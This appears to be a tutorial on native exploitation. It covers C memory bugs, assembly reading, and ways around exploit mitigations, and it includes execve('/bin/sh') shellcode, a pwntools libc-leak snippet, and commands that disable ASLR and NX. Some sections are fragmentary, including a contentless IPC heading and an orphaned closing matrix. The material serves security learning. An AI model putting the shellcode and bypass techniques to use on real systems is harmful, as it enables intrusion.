C Memory Model for Security

Why This Matters

In web apps, the runtime (JVM, V8, Python) manages memory for you. In native apps, the programmer manages memory directly. Most native vulnerabilities stem from memory management mistakes.

Process Memory Layout

High Address
┌─────────────────────┐
│      Stack          │  ← grows DOWN (local vars, return addresses)
│         ↓           │
│                     │
│         ↑           │
│      Heap           │  ← grows UP (malloc/new)
├─────────────────────┤
│      BSS            │  ← uninitialized global/static vars (zeroed)
├─────────────────────┤
│      Data           │  ← initialized global/static vars
├─────────────────────┤
│      Text (.text)   │  ← executable code (read-only)
└─────────────────────┘
Low Address

The Stack — Where Exploits Begin

Each function call creates a stack frame:

┌─────────────────────┐  ← Higher address
│  Caller's arguments │
├─────────────────────┤
│  Return address     │  ← RIP/EIP to return to after function
├─────────────────────┤
│  Saved base pointer │  ← Previous RBP/EBP
├─────────────────────┤
│  Local variables    │  ← char buf[64], int x, etc.
├─────────────────────┤
│  ...                │  ← Lower address (stack grows down)
└─────────────────────┘

Key insight for exploitation: Local buffers are BELOW the return address. Overflow a buffer upward → overwrite return address → control execution.

The Heap — Dynamic Memory

char *ptr = malloc(64);   // Allocator finds 64 bytes in heap
// ... use ptr ...
free(ptr);                 // Return memory to allocator

Key vulnerability patterns:

  • Use-after-free: Using ptr after free(ptr) — the memory may be reallocated to attacker-controlled data
  • Double-free: Calling free(ptr) twice — corrupts allocator metadata
  • Heap overflow: Writing past allocated size — corrupts adjacent heap chunks

Pointers — The Root of All Evil

int x = 42;
int *p = &x;     // p holds the ADDRESS of x
*p = 99;         // dereference: write 99 to the address p holds

int *q = NULL;
*q = 1;          // SEGFAULT — dereferencing NULL

int *r;          // uninitialized — holds GARBAGE address
*r = 1;          // undefined behavior — might crash, might corrupt random memory

Security implications:

  • Uninitialized pointers → info leak or arbitrary write
  • Dangling pointers (freed memory) → use-after-free
  • Pointer arithmetic errors → out-of-bounds read/write

Arrays ≠ Bounds-Checked

char buf[8];
buf[8] = 'A';   // OUT OF BOUNDS — no runtime error in C!
                  // Overwrites whatever is at buf + 8

Web analogy: Imagine if JavaScript arrays silently let you write to arr[-1] and it overwrote unrelated variables. That's C every day.

Strings in C

char str[] = "hello";   // Actually 6 bytes: h-e-l-l-o-\0
  • C strings are just char arrays terminated by \0 (null byte)
  • No length tracking — functions rely on finding \0
  • If \0 is missing or overwritten → functions read/write past the buffer

Web ↔ Native Mapping

Web Concept Native Equivalent
XSS (inject code into page) Buffer overflow (inject code into memory)
SQL injection (break out of data context) Format string (break out of string context)
Prototype pollution Heap metadata corruption
SSRF (make server fetch attacker URL) TOCTOU (make program open attacker file)
Deserialization Type confusion / Use-after-free

Dangerous C Functions & Patterns

The "Never Use" List

These functions have NO way to limit how much they read/write. They are the #1 source of buffer overflows in legacy code.

String Functions

Dangerous Safe Alternative Why Dangerous
gets(buf) fgets(buf, size, stdin) No size limit, always overflows
strcpy(dst, src) strncpy(dst, src, n) or strlcpy No bounds check on dst
strcat(dst, src) strncat(dst, src, n) or strlcat No bounds check on dst
sprintf(buf, fmt, ...) snprintf(buf, size, fmt, ...) No bounds check on buf
scanf("%s", buf) scanf("%63s", buf) (with width) No bounds check

Memory Functions

Pattern Risk
memcpy(dst, src, user_len) If user_len > dst size → overflow
malloc(user_size) If user_size is 0 or huge → issues
realloc(ptr, new_size) If new_size overflows integer → tiny alloc

Format String

// DANGEROUS — user controls format string
printf(user_input);           // can read/write arbitrary memory!

// SAFE — user data is an argument, not the format
printf("%s", user_input);     // always safe

Pattern: Integer Overflow Before Allocation

// User sends: width=65536, height=65536
size_t size = width * height * 4;  // 2^34 → overflows to small number on 32-bit!
char *buf = malloc(size);           // tiny allocation
memcpy(buf, data, width * height * 4);  // massive write → heap overflow

Fix: Check for overflow before arithmetic:

if (width > SIZE_MAX / height / 4) { return ERROR; }

Pattern: Off-by-One

char buf[256];
for (int i = 0; i <= 256; i++) {  // Should be < 256
    buf[i] = src[i];              // Writes 257 bytes into 256-byte buffer
}

One byte overflow can overwrite saved frame pointer → redirect execution.

Pattern: Missing NULL Terminator

char buf[8];
strncpy(buf, "12345678", 8);  // strncpy does NOT null-terminate if src >= n!
printf("%s", buf);             // reads past buf until it finds \0 → info leak

Pattern: Double-Free

char *ptr = malloc(64);
free(ptr);
// ... later, maybe in error handling path ...
free(ptr);  // Corrupts heap allocator metadata!

Fix: Set pointer to NULL after free, check before free:

free(ptr);
ptr = NULL;

Pattern: Use-After-Free

struct User *user = malloc(sizeof(struct User));
user->admin = 0;
free(user);

// ... attacker triggers allocation of same size ...
struct Evil *evil = malloc(sizeof(struct Evil));  // may get same memory!
evil->data = 1;

// ... code still holds old pointer ...
if (user->admin) {  // reads evil->data which is 1!
    grant_access();
}

Pattern: Uninitialized Stack Variable

void process_request() {
    char buffer[1024];       // NOT zeroed! Contains previous stack frame data
    int len = read(fd, buffer, 10);
    send(client, buffer, 1024);  // Sends 1014 bytes of uninitialized stack → INFO LEAK
}

What to Look For in Code Review

  1. Any use of gets, strcpy, strcat, sprintf, scanf("%s"...)
  2. memcpy/memmove where size comes from user input without validation
  3. Arithmetic on sizes/lengths without overflow checks
  4. free() without NULLing the pointer + continued use of pointer
  5. Stack buffers sent to network without explicit length
  6. strncpy without manual null termination
  7. Allocations based on user_count * element_size without overflow check

Binary Formats Overview

Why Understand Binary Formats?

When you reverse engineer or analyze a native app, the binary format is the first thing you encounter. It tells you:

  • What OS it's built for
  • What libraries it uses (imports)
  • What functions it exports
  • Where code/data lives in memory
  • Security features enabled (NX, ASLR, RELRO, PIE)

The Three Formats

Format OS Extension Tool
ELF (Executable and Linkable Format) Linux, BSD none, .so, .o readelf, objdump
PE (Portable Executable) Windows .exe, .dll, .sys dumpbin, PE-bear
Mach-O (Mach Object) macOS, iOS none, .dylib, .o otool, jtool2

ELF Format (Linux) — Deep Dive

┌──────────────────────┐
│ ELF Header           │  ← Magic: 7f 45 4c 46 (.ELF)
│  - Architecture      │     Class (32/64), endianness, OS ABI
│  - Entry point       │     Address where execution starts
│  - Program headers   │     How to load into memory
│  - Section headers   │     How to interpret the file
├──────────────────────┤
│ Program Headers      │  ← Segments (runtime view)
│  - LOAD (code)       │     Map .text into memory (R-X)
│  - LOAD (data)       │     Map .data/.bss into memory (RW-)
│  - DYNAMIC           │     Dynamic linking info
│  - GNU_STACK         │     Stack executability (NX bit)
├──────────────────────┤
│ .text                │  ← Executable code
├──────────────────────┤
│ .rodata              │  ← Read-only data (strings, constants)
├──────────────────────┤
│ .data                │  ← Initialized global variables
├──────────────────────┤
│ .bss                 │  ← Uninitialized globals (zeroed at load)
├──────────────────────┤
│ .plt / .got          │  ← Procedure Linkage Table / Global Offset Table
│                      │     How shared library calls are resolved
├──────────────────────┤
│ .dynamic             │  ← Dynamic linker info (needed libs, symbols)
├──────────────────────┤

├──────────────────────┤
│ Section Headers      │  ← Table describing all sections
└──────────────────────┘

Essential Commands

# Basic info
file ./binary
readelf -h ./binary          # ELF header (arch, entry point)
readelf -l ./binary          # Program headers (segments)
readelf -S ./binary          # Section headers
readelf -s ./binary          # Symbol table (functions, globals)
readelf -d ./binary          # Dynamic section (dependencies)

# Security features
checksec --file=./binary     # RELRO, Stack Canary, NX, PIE, RPATH, etc.

# Strings (often reveals functionality/secrets)
strings ./binary | less
strings -n 8 ./binary        # Only strings >= 8 chars

Security-Relevant Sections

  • .got / .got.plt — Global Offset Table. Writable by default → target for exploitation (GOT overwrite). RELRO mitigation makes it read-only.
  • GNU_STACK — If set to RWE, stack is executable (no NX). Modern binaries set RW- (NX enabled).
  • PT_LOAD segments — Show what memory permissions each region has. Key for knowing what's writable vs executable.

  • ASLR — Requires .reloc section + DYNAMIC_BASE flag
  • DEP/NX — NX_COMPAT flag in Optional Header
  • CFG (Control Flow Guard) — Guard CF function table
  • Authenticode — Code signing info in security directory

OS Internals for Security

Process Model

Every running program is a process with:

  • Its own virtual address space (isolated from other processes)
  • A set of open file descriptors
  • Credentials (UID/GID on Unix, token on Windows)
  • One or more threads of execution

Security Implications

  • Process isolation is the OS's primary security boundary
  • Bugs that break isolation (kernel vulns, shared memory issues) are critical
  • Privilege levels determine what a process can do

Virtual Memory

Each process thinks it has the full address space to itself:

Process A sees:          Physical RAM:         Process B sees:
┌─────────┐             ┌──────────┐          ┌─────────┐
│ 0x4000  │──┐          │ Frame 1  │     ┌────│ 0x4000  │
│ (code)  │  └────────→ │ (A code) │     │    │ (code)  │
├─────────┤             ├──────────┤     │    ├─────────┤
│ 0x7fff  │──┐          │ Frame 2  │←────┘    │ 0x7fff  │
│ (stack) │  │          │ (B code) │          │ (stack) │
└─────────┘  │          ├──────────┤          └─────────┘
             └────────→ │ Frame 3  │
                        │ (A stack)│
                        └──────────┘

Key concepts:

  • Page tables map virtual → physical addresses (per-process)
  • Permissions per page: Read, Write, Execute (basis for NX/DEP)
  • ASLR randomizes where segments are mapped → harder to predict addresses
  • mmap/VirtualAlloc — creates new memory mappings (used by allocators, shared libs)

System Calls (syscalls)

The ONLY way user-space code talks to the kernel:

User space (ring 3)                    Kernel space (ring 0)
┌──────────────────┐                   ┌──────────────────┐
│ open("file", ..) │──── syscall ────→ │ sys_open(...)    │
│                  │←─── return  ────  │ returns fd       │
└──────────────────┘                   └──────────────────┘

Common Security-Relevant Syscalls

Syscall Purpose Security Angle
open/read/write File I/O Path traversal, TOCTOU
exec* Launch process Command injection
mmap/mprotect Memory mapping Make memory executable (bypass NX)
ptrace Debug/trace process Used for injection & anti-debug
socket/connect/bind Networking SSRF, binding to 0.0.0.0
setuid/setgid Change credentials Privilege escalation
clone/fork Create process/thread Race conditions

Privilege Rings (x86)

┌────────────────────────────────────┐
│         Ring 3 (User)              │  ← Normal applications
│    ┌───────────────────────┐       │
│    │    Ring 0 (Kernel)    │       │  ← OS kernel, drivers
│    │   ┌──────────────┐   │       │
│    │   │   Ring -1     │   │       │  ← Hypervisor (VMX root)
│    │   │  (Hypervisor) │   │       │
│    │   └──────────────┘   │       │
│    └───────────────────────┘       │
└────────────────────────────────────┘
  • Ring 3 code can't execute privileged instructions (in/out, cli, mov cr3)
  • Transition to Ring 0 happens via syscall/interrupt
  • Kernel vulnerabilities give Ring 0 access → full system compromise

Inter-Process Communication (IPC)

Processes need to communicate. Each IPC mechanism has its attack surface:

x86-64 Assembly Reading

Goal

You do not need to become an assembly programmer first. The immediate goal is to recognize compiler patterns well enough to recover source-level intent from disassembly and decompiler output.

Registers You Will See Constantly

Register Usual role
rip Instruction pointer: address of the next instruction
rsp Stack pointer: current top of stack
rbp Base/frame pointer: stable reference for local variables when frame pointers are enabled
rax Return value, scratch register, syscall number on Linux/macOS
rdi, rsi, rdx, rcx, r8, r9 First six integer/pointer args on System V AMD64
rcx, rdx, r8, r9 First four integer/pointer args on Win64
r10–r15 Callee-saved (r12–r15) or scratch (r10, r11)

Sub-register Naming

Each 64-bit register has smaller views:

rax  (64-bit)
eax  (lower 32-bit) — writing to eax zeroes upper 32 bits
ax   (lower 16-bit)
ah   (bits 15–8)
al   (bits 7–0)

This matters because compilers choose the smallest operand size that fits. xor eax, eax zeroes all 64 bits of rax (cheaper encoding than xor rax, rax).

RFLAGS — Condition Codes

Flag Name Set by
ZF Zero Flag Result is zero
SF Sign Flag Result is negative (MSB = 1)
CF Carry Flag Unsigned overflow/underflow
OF Overflow Flag Signed overflow

cmp a, b computes a - b and sets flags without storing the result. test a, b computes a & b and sets flags.

System V AMD64 Calling Convention

Used by Linux and macOS for normal user-space calls:

arg1 -> rdi
arg2 -> rsi
arg3 -> rdx
arg4 -> rcx
arg5 -> r8
arg6 -> r9
return -> rax

If there are more than six arguments, the rest are passed on the stack (pushed right to left).

Caller-saved (volatile): rax, rcx, rdx, rsi, rdi, r8–r11

Callee-saved (non-volatile): rbx, rbp, r12–r15

Stack alignment: The stack must be 16-byte aligned before a call instruction. Since call pushes an 8-byte return address, the callee sees rsp % 16 == 8 at entry. This matters for ROP chains — a misaligned stack causes movaps crashes in libc functions.

Win64 Calling Convention

Used by Windows x64:

arg1 -> rcx
arg2 -> rdx
arg3 -> r8
arg4 -> r9
return -> rax

Win64 also reserves 32 bytes of shadow space on the stack for callees, even if there are fewer than 4 args. Floating-point args go in xmm0–xmm3.

Common Instruction Patterns

Move and Load Address

mov rax, qword ptr [rbp - 0x8]    ; load 8 bytes from stack into rax
lea rdi, [rip + 0x1234]           ; load address (RIP-relative) into rdi
mov dword ptr [rbp - 0xc], 0x0    ; store immediate to stack local

mov copies a value. lea computes an address without dereferencing it — often used for strings, arrays, struct field addresses, and even arithmetic (lea rax, [rdi + rdi2] = rax = rdi 3).

Arithmetic

add rax, 0x10      ; rax += 16
sub rsp, 0x40      ; allocate 64 bytes on stack
imul rax, rcx, 4   ; rax = rcx * 4 (signed)
shl rax, 3         ; rax <<= 3 (multiply by 8)
shr rax, 2         ; rax >>= 2 (unsigned divide by 4)
sar rax, 2         ; rax >>= 2 (signed, preserves sign bit)

Compare and Branch

cmp eax, 0x2a      ; compare eax with 42
jne fail            ; jump if not equal (ZF=0)

Common conditional jumps:

Instruction Condition Meaning
je / jz ZF=1 Equal / Zero
jne / jnz ZF=0 Not equal / Not zero
jl / jnge SF≠OF Less than (signed)
jg / jnle ZF=0 and SF=OF Greater than (signed)
jb / jnae CF=1 Below (unsigned)
ja / jnbe CF=0 and ZF=0 Above (unsigned)
jle ZF=1 or SF≠OF Less or equal (signed)
jge SF=OF Greater or equal (signed)

Security note: Signed vs unsigned jump choice matters. A length check using jl instead of jb can be bypassed with negative values.

Test (Bitwise AND for flags)

test eax, eax      ; sets ZF if eax == 0
jz is_null          ; jump if zero (common null-pointer check)

test al, 1          ; check if least significant bit is set
jnz is_odd          ; jump if odd

test is preferred over cmp rax, 0 because it's shorter.

Function Call

mov rdi, rax        ; first argument
mov esi, 0x40       ; second argument (32-bit immediate)
call _puts
test eax, eax       ; check return value

Before a call, inspect argument registers. After a call, inspect rax for the return value.

Function Prologue/Epilogue

; Prologue
push rbp            ; save caller's frame pointer
mov rbp, rsp        ; establish new frame
sub rsp, 0x40       ; allocate 64 bytes for locals

; ... function body ...

; Epilogue
leave               ; mov rsp, rbp; pop rbp
ret                 ; pop return address into rip

Local variables are typically at negative offsets from rbp ([rbp-0x8], [rbp-0x10], etc.).

Note: With -fomit-frame-pointer (default at higher optimization levels), the compiler uses rsp-relative addressing instead of rbp. This makes stack layout harder to read but saves a register.

Stack Operations

push rax            ; rsp -= 8; [rsp] = rax
pop rbx             ; rbx = [rsp]; rsp += 8

NOP Sled and Alignment

nop                 ; single-byte no-op (0x90)
nop dword ptr [rax] ; multi-byte NOP for alignment

Compilers insert multi-byte NOPs for alignment. In exploitation, NOP sleds (\x90\x90\x90...) create a landing zone for shellcode.

Control Flow Reconstruction

if/else Pattern

if (x > 10) { a(); } else { b(); }

Compiles to:

cmp dword ptr [rbp-0x4], 0xa
jle .else_branch     ; note: condition is INVERTED
call _a
jmp .end
.else_branch:
call _b
.end:

Key insight: The compiler inverts the condition. if (x > 10) becomes jle (jump to else if x <= 10).

for Loop Pattern

for (int i = 0; i < n; i++) { body(); }

Compiles to:

mov dword ptr [rbp-0x4], 0    ; i = 0
jmp .check
.body:
call _body
add dword ptr [rbp-0x4], 1    ; i++
.check:
cmp dword ptr [rbp-0x4], edi  ; i < n
jl .body

Look for: initialization → forward jump to check → body → increment → backward jump.

while Loop Pattern

while (ptr != NULL) { ptr = ptr->next; }

Compiles to:

.check:
cmp qword ptr [rbp-0x8], 0    ; ptr != NULL
je .done
mov rax, [rbp-0x8]
mov rax, [rax+0x8]             ; ptr->next (offset 0x8)
mov [rbp-0x8], rax             ; ptr = ptr->next
jmp .check
.done:

Switch Statement (Jump Table)

switch(x) { case 0: ...; case 1: ...; case 2: ...; }

Compiles to:

cmp eax, 2
ja .default              ; if x > 2, go to default
lea rcx, [rip + .jtable] ; load jump table address
movsxd rax, [rcx + rax*4] ; load relative offset
add rax, rcx             ; compute target address
jmp rax                  ; indirect jump

Ghidra tip: Ghidra usually recognizes jump tables and creates labeled cases.

Tail Call Optimization

; Instead of: call func; ret
jmp func                 ; saves stack frame, harder to trace

The function directly jumps to another function rather than calling and returning. This means the call stack in a debugger may miss intermediate functions.

Recognizing Data Structures

Array Access

mov eax, [rbx + rcx*4]  ; array[i] where sizeof(element) == 4
lea rdi, [rax + rax*4]  ; rdi = rax * 5 (common in struct array indexing)

Struct Field Access

mov rax, [rdi + 0x18]   ; field at offset 0x18 in struct pointed by rdi
mov [rdi + 0x20], rsi   ; store to field at offset 0x20

Repeated access to a register + different offsets strongly suggests a struct pointer.

String Operations

rep movsb               ; memcpy: copy rcx bytes from [rsi] to [rdi]
rep stosb               ; memset: fill rcx bytes at [rdi] with al
repne scasb             ; strlen: scan for null byte

How to Reverse a Function

  1. Identify inputs: argument registers at function entry.
  2. Identify outputs: final value in rax, writes to pointers, global changes.
  3. Rename obvious locals and functions in your disassembler.
  4. Track strings and constants first. They carry meaning (error messages, format strings, magic numbers).
  5. Reconstruct branches and loops — draw the control flow graph.
  6. Compare decompiler output against assembly when logic looks suspicious. The decompiler can get types wrong.
  7. Cross-reference called functions — knowing what sub_401234 does helps you understand the caller.

Cross-References (Xrefs) — The Most Powerful Feature

Cross-references answer: "Who calls this?" and "Who uses this data?"

Reading Xrefs

When you see a function or data label, the Xref display shows:

XREF[3]:  main:00401234(c),
          validate:004015ab(c),
          error_handler:00401789(c)
  • (c) = call reference
  • (r) = read reference
  • (w) = write reference
  • (*) = pointer/address-of reference

Xref Workflow

  1. Found an interesting string like "Access granted"? → Show Xrefs → find which function references it.
  2. Found strcmp? → Show Xrefs → find all call sites → these are likely validation checks.
  3. Found malloc? → Show Xrefs → find where allocated pointers are freed (or not freed).
  4. Found a global variable? → Show write Xrefs → who modifies it?

Common Pitfalls

  • Decompiler type invention: The decompiler can invent types that are convenient but wrong. A uint shown in the decompiler might actually be a pointer.
  • Optimized code issues: Inlined functions won't appear as separate function calls. Merged variables may show as one variable used for multiple purposes.
  • Signed vs unsigned confusion: Check the actual jump instruction (jl vs jb) and data type. The decompiler may show int when the code uses unsigned comparison.
  • Strings ≠ secrets: Strings are routes to real logic, not necessarily the answer. Follow the xrefs.
  • Stripped binaries: No function names, but you still have imports, sections, strings, cross-references, and control-flow structure. Start from entry and trace to main.
  • Tail calls: jmp to another function looks like a fall-through in the decompiler, not a separate call.
  • Indirect calls: Function pointers (call [rax]) and vtables won't show as named calls. You need to figure out what's in the register.

Breakpoint Strategy

Phase 1: Understand Flow

  • Break at main — understand how input arrives (argv, stdin, file).
  • Break at string/comparison functions: strcmp, strncmp, memcmp.
  • Break at output functions: printf, puts — follow xrefs from Ghidra to identify success/failure paths.

Phase 2: Inspect Values

  • Break on the validation function (identified in Ghidra).
  • Inspect argument registers before comparison.
  • Step through computation to understand transformations.

Phase 3: Exploit Development

  • Break at vulnerable function (identified buffer overflow, format string, etc.).
  • Break at ret instruction to inspect stack state.
  • Use watchpoints to catch when return address or canary is overwritten.

Watchpoints

Watchpoints break execution when a specific memory address is read or written. Essential for finding:

  • When a variable changes unexpectedly
  • When a return address is overwritten (buffer overflow)
  • When heap metadata is corrupted

execve("/bin/sh", NULL, NULL) — The Classic Payload

The goal of most shellcode is to call execve("/bin/sh", NULL, NULL):

rax = 59        (execve syscall number)
rdi = pointer to "/bin/sh\0"
rsi = 0         (argv = NULL)
rdx = 0         (envp = NULL)

Classic Implementation

; 27 bytes, null-free execve shellcode
xor    rsi, rsi           ; rsi = 0 (argv = NULL)
xor    rdx, rdx           ; rdx = 0 (envp = NULL)
mov    rax, 0x68732f6e69622f  ; "/bin/sh\0" in little-endian (only 7 chars + implicit null from push)
push   rax                ; push "/bin/sh" onto stack
mov    rdi, rsp           ; rdi = pointer to "/bin/sh" on stack
xor    rax, rax           ; clear rax
mov    al, 59             ; rax = 59 (execve), using al avoids null bytes
syscall                   ; execute!

Step-by-Step Explanation

  1. Zero rsi and rdx: Using xor reg, reg instead of mov reg, 0 because mov rsi, 0 encodes null bytes (\x00\x00\x00\x00).
  2. Push the string: /bin/sh is 7 bytes. In little-endian 64-bit: 0x0068732f6e69622f. We push this as a qword onto the stack.
  3. Point rdi to the string: After push, rsp points to our string.
  4. Set syscall number: mov al, 59 sets only the low byte of rax (which was zeroed), avoiding null bytes in the encoding.
  5. syscall: Triggers the kernel to execute /bin/sh.

Alternative: Two-Push Method (Avoids 8-byte Immediate)

xor    rsi, rsi
push   rsi                ; null terminator on stack
mov    rdi, 0x68732f2f6e69622f  ; "//bin/sh" (8 bytes, // is ok)
push   rdi
mov    rdi, rsp           ; point to string
xor    rdx, rdx
mov    al, 59
syscall

Using //bin/sh (double slash) makes the string exactly 8 bytes. The OS treats // the same as /.

Constraints

Null-Free

Many string copy vulnerabilities (like strcpy) stop at \x00 bytes. If your shellcode contains null bytes, only part of it will be copied.

Common null-byte sources and fixes:

Produces Nulls Null-Free Alternative
mov rax, 0 xor rax, rax
mov rax, 59 xor rax, rax; mov al, 59
mov rdi, 0 xor rdi, rdi
push 0 xor rax, rax; push rax

Size Constraints

The vulnerable buffer may be small. Techniques for shorter shellcode:

  • Use shorter instruction encodings (push/pop instead of mov)
  • Eliminate unnecessary register zeroing
  • Use cdq (sign-extend eax into edx, zeroing edx if eax is small positive)
  • Use egg hunters or staged shellcode

Position Independence

Shellcode cannot assume it will land at a fixed address. Everything must use relative addressing:

  • Push strings onto the stack and reference via rsp
  • Use call/pop trick for position-independent data references (call next; next: pop rsi)
  • Use RIP-relative lea in 64-bit mode

Syscall-Only

Shellcode typically avoids libc because:

  • libc addresses are randomized (ASLR)
  • Calling libc requires knowing its base address
  • Direct syscalls bypass any libc hooks or wrappers

NX/DEP and Why Shellcode Alone Isn't Enough

Modern binaries mark stack and heap as non-executable (NX/DEP). Attempting to execute shellcode on the stack results in a segfault.

# Check if NX is enabled:
checksec --file=./target
# Look for "NX: enabled"

When NX is enabled, you can't just inject and run shellcode. You need:

  • ROP (Phase 2D) to chain existing executable code
  • ret2libc to call system("/bin/sh") without injected code
  • mprotect ROP chain to make a memory region executable, then jump to shellcode

Shellcoding skills are still essential because:

  1. Some targets don't have NX (embedded systems, older software, JIT regions)
  2. You need shellcode for the payload after bypassing NX
  3. Understanding shellcode is prerequisite for understanding ROP

macOS Note

macOS syscalls differ from Linux:

  • Syscall numbers are offset by 0x2000000 (e.g., execve = 0x200003b)
  • Code signing and Hardened Runtime can prevent execution of injected code
  • W^X enforcement is stricter on Apple Silicon

Use Linux VM for shellcoding labs first. Return to macOS when studying platform-specific constraints in Phase 3.

Stack Canary (Stack Protector)

How It Works

A random value (the "canary") is placed between local buffers and the saved return address when a function is entered. Before the function returns, the canary is checked — if it changed, the program aborts.

Stack Layout (with canary):
┌─────────────────────┐  ← Higher address
│  Return address      │
├─────────────────────┤
│  Saved RBP           │
├─────────────────────┤
│  Stack Canary ████   │  ← Random value, checked before ret
├─────────────────────┤
│  Local variables     │
│  char buf[64]        │  ← Overflow goes UP toward canary
└─────────────────────┘  ← Lower address

Canary Implementation Details

  • On Linux (glibc): canary is stored in fs:[0x28] (thread-local storage).
  • First byte is usually \x00 to prevent string-based leaks (null terminator stops printf/puts).
  • Canary is set at function prologue, checked at epilogue:
; Prologue — read canary from TLS
mov    rax, qword ptr fs:[0x28]
mov    qword ptr [rbp-0x8], rax

; Epilogue — verify canary
mov    rax, qword ptr [rbp-0x8]
xor    rax, qword ptr fs:[0x28]
jne    __stack_chk_fail            ; if changed → abort
leave
ret

Compiler Flags

gcc -fstack-protector         # protect functions with char arrays
gcc -fstack-protector-all     # protect ALL functions
gcc -fstack-protector-strong  # protect functions with local arrays or address-taken variables (default in modern GCC)
gcc -fno-stack-protector      # DISABLE (for learning labs only!)

Bypass Techniques

Technique Conditions Needed How
Info leak Ability to read memory (format string, over-read) Leak the canary value, include it in your overflow payload
Brute force Forking server (canary same in children) Guess canary byte-by-byte (256 tries per byte, 4 bytes max = 1024 tries)
Bypass entirely Overwrite target before canary check Target function pointers, heap objects, or __stack_chk_fail GOT entry
Thread canary leak Multi-threaded, overflow reaches TLS Overwrite TLS canary to match your overflow value

NX / DEP (Non-Executable Memory)

How It Works

Hardware-enforced: page table entries mark memory regions as non-executable. The CPU raises a fault if code execution is attempted in a non-executable page.

Memory permissions with NX enabled:
.text    (code)    → R-X (readable, executable, NOT writable)
.data    (globals) → RW- (readable, writable, NOT executable)
Stack              → RW- (readable, writable, NOT executable)
Heap               → RW- (readable, writable, NOT executable)

Without NX: Attacker injects shellcode into buffer → overwrites return address → jumps to shellcode → shell.

With NX: Same attack → CPU tries to execute on stack → SEGFAULT (signal 11).

Compiler/Linker Flags

gcc -z noexecstack    # enable NX (default on modern systems)
gcc -z execstack      # DISABLE NX (for shellcode labs only!)

# Check:
readelf -l ./binary | grep GNU_STACK
# RW = NX enabled, RWE = NX disabled

Bypass Techniques

Technique Description
ret2libc Call existing libc functions (system, execve) — no injected code needed
ROP Chain gadgets from existing executable regions
mprotect/mmap ROP Use ROP to make a memory region executable, then jump to shellcode
JIT spraying Abuse JIT compilers to create executable memory with attacker-controlled content
Sigreturn (SROP) Use sigreturn to set all registers from a forged signal frame

ASLR (Address Space Layout Randomization)

How It Works

The OS randomizes the base addresses of:

  • Stack (high entropy)
  • Heap (moderate entropy)
  • Shared libraries (libc, ld.so, etc.)
  • PIE binary base (if compiled as PIE)
  • mmap regions
  • vDSO / vvar
# Check ASLR status (Linux):
cat /proc/sys/kernel/randomize_va_space
# 0 = disabled, 1 = partial (stack/libs), 2 = full (+ heap, PIE)

# Disable for labs (requires root):
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# macOS ASLR is always enabled for system binaries

Entropy

Region Typical Entropy (Linux x86-64)
Stack 22 bits (8 MB range)
mmap/libs 28 bits
Heap 13 bits
PIE binary 28 bits

Higher entropy = more guesses needed = harder to brute force.

Bypass Techniques

Technique Conditions How
Info leak Format string, over-read, error message Leak any pointer into a known region → calculate base address
Partial overwrite Controlling only low bytes of a pointer Low 12 bits (page offset) are never randomized. Overwrite 1–2 bytes for 1/16 to 1/256 success rate
Brute force 32-bit (low entropy) or forking server Guess the base address repeatedly
Return to known region Non-PIE binary with ASLR Binary addresses are fixed; use gadgets from the binary itself
Heap spray Browser/JIT contexts Fill heap with predictable data at predictable offsets

Leak → Calculate Pattern

from pwn import *

# Step 1: Leak a libc address (e.g., puts@GOT after resolution)
leaked_puts = u64(p.recv(6).ljust(8, b'\x00'))

# Step 2: Calculate libc base
libc_base = leaked_puts - libc.symbols['puts']

# Step 3: Calculate any function address
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

RELRO (Relocation Read-Only)

How It Works

Controls whether the GOT (Global Offset Table) is writable after program startup.

How dynamic function calls work (lazy binding):

1. Program calls printf() → jumps to PLT stub
2. PLT stub reads GOT entry → first time, GOT points back to PLT (resolver)
3. Dynamic linker resolves printf's actual address → writes it to GOT
4. Subsequent calls → PLT reads GOT → jumps directly to printf

GOT overwrite attack: If attacker can write to GOT, they can redirect
any library call to an arbitrary address (e.g., system()).

RELRO Levels

Mode GOT State Exploit Impact
No RELRO GOT fully writable, lazy binding GOT overwrite is trivial
Partial RELRO .got (non-PLT) read-only, .got.plt still writable, lazy binding GOT overwrite still possible on PLT entries
Full RELRO All GOT entries resolved at startup, entire GOT made read-only GOT overwrite blocked; need alternative targets 
# Compiler flags:
gcc -Wl,-z,relro        # partial RELRO (default)
gcc -Wl,-z,relro,-z,now # full RELRO (resolves all symbols at startup)
gcc -Wl,-z,norelro      # no RELRO (for labs)

# Check:
readelf -d ./binary | grep BIND_NOW  # if present → full RELRO
checksec --file=./binary

When Full RELRO Blocks GOT Overwrite

Alternative targets:

  • Return addresses on the stack
  • Function pointers in heap objects, structs, or vtables
  • __malloc_hook / __free_hook (removed in modern glibc ≥ 2.34)
  • _IO_FILE vtable pointers (FSOP)
  • .fini_array function pointers (called at exit)
  • atexit handlers
  • TLS __stack_chk_guard (overwrite canary storage)

PIE (Position Independent Executable)

How It Works

Normally, a non-PIE binary is loaded at a fixed address (e.g., 0x400000 on Linux x86-64). With PIE, the binary itself is loaded at a random base address, just like shared libraries.

# Check:
file ./binary
# "ELF 64-bit LSB pie executable" vs "ELF 64-bit LSB executable"

checksec --file=./binary
# PIE: enabled/disabled

# Compile:
gcc -pie -fPIE -o binary source.c    # enable PIE (default on modern distros)
gcc -no-pie -o binary source.c       # disable PIE (for learning)

Impact on Exploitation

  • Without PIE: Code addresses (gadgets, PLT, GOT) are known → can use directly in ROP chains.
  • With PIE: Must first leak a code address → calculate binary base → then use gadgets.

CFI / CET (Advanced Mitigations)

Control Flow Integrity (CFI)

Compiler-enforced restriction on indirect call/jump targets. Each call site is validated against a set of allowed targets at runtime.

# Clang CFI:
clang -fsanitize=cfi -flto -fvisibility=hidden source.c

Intel CET (Control-flow Enforcement Technology)

Hardware-based protection:

  • Shadow Stack: Hardware maintains a separate stack of return addresses. ret compares return address against shadow stack — mismatch causes fault.
  • Indirect Branch Tracking (IBT): Every valid indirect jump/call target must start with ENDBR64 instruction.

Impact: Makes ROP significantly harder (shadow stack catches return address overwrites), and JOP/COP (call-oriented programming) harder (IBT).

Fortify Source

Compile-time replacement of unsafe functions with bounds-checked versions:

gcc -D_FORTIFY_SOURCE=2 -O2 source.c
# Replaces strcpy → __strcpy_chk, memcpy → __memcpy_chk, etc.
# Checks at compile time AND runtime where possible

Mitigation Interaction Matrix

  Also affected by: ASLR (if injecting to known addr), canary (if overflowing)

  Need to bypass: RELRO (must be partial or none), ASLR (to know GOT address if PIE)

  Need to bypass: ASLR (to know libc/heap addresses), safe-linking (modern glibc)
